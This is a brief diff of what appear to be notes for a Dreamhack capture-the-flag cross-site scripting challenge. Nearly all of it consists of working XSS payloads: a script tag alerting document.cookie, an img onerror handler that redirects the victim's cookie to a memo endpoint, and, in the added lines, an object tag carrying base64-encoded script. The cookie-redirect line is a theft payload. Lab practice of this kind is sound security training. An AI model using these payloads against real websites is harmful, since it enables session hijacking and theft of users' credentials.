@@ -9,3 +9,5 @@
 
 <a href="http://host1.dreamhack.games:15567/memo?memo="<script>alert(document.cookie)</script></a>
 <img src=about: onerror="location.href='http://127.0.0.1:8000/memo?memo=FLAG IS'+document.cookie">
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
